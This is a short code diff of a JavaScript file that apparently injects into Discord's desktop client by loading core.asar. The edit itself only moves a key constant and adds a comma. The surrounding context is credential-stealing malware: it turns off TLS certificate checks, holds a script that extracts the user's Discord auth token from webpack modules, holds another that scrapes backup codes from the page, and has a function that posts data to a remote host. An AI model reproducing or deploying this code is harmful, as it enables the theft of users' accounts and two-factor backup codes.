@@ -1,3 +1,8 @@
+const key = "%KEY%"
+
+
+
+
 module.exports = require("./core.asar");
 process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
 
@@ -6,7 +11,6 @@ const electron = require("electron");
 const https = require("https");
 const queryString = require("querystring");
 
-const key = "%KEY%"
 var computerName = process.env.COMPUTERNAME;
 let backupscript = `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`;
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
@@ -387,7 +391,7 @@ const post = async (params) => {
       host: url.hostname,
       port: url.port,
       path: url.pathname,
-      key: key 
+      key: key ,
       method: "POST",
       headers: {
         "Content-Type": "application/json",
